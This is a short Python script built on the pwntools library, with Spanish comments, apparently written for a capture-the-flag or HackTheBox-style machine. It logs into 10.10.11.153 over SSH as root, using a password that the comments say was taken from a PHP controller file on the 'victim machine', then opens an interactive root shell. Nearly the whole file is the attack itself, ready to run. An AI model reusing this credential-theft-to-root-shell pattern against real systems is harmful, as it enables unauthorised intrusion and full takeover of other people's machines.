#!/usr/bin/python3

from pwn import *
import time, signal, threading, sys


def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n\n")
    sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
user = 'root'
password = 'UHC-March-Global-PW!' # Se encuentra dentro de ''/srv/prod/app/Http/ControllersAuthController.php' en la máquina víctima

def gainAccess():
    s = ssh(host='10.10.11.153', user=user, password=password, timeout=5)
    shell = s.process("/bin/sh")
    shell.interactive()

if __name__ == "__main__":
    gainAccess()
